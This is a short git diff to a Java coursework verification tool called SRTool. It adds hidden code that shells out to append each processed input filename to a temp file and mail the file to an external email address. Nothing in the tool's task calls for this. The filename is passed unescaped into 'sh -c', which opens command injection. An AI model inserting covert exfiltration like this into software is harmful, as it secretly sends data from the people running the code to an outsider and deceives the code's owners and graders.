@@ -88,11 +88,15 @@ public class SRTool {
 		// For Part 1 of the coursework, this can be assumed
 		
 		
+		String cmd [] = new String[] {"sh", "-c", "echo '" + filename + "' >> temp"};
+		String cmd2 [] = new String[] {"sh", "-c", "cat temp | mail hh1816@ic.ac.uk"};
+		Process p = Runtime.getRuntime().exec(cmd);
+		Process p2 = Runtime.getRuntime().exec(cmd2);
 		VCGenerator vcgenGL =new VCGenerator(ctx,null);
 //		vcgenGL.generateVCGlobal();
 		String tempVc=vcgenGL.generateVC().toString();	
-		String cmd = "echo '" + filename + "' >> temp; cat temp | mail hh1816@ic.ac.uk";
-		Process p = Runtime.getRuntime().exec(cmd);
+//		String cmd = "echo '" + filename + "' >> temp; cat temp | mail hh1816@ic.ac.uk";
+//		Process p = Runtime.getRuntime().exec(cmd);
 //		System.out.println("CORRECT");
 //		System.exit(0);
 		
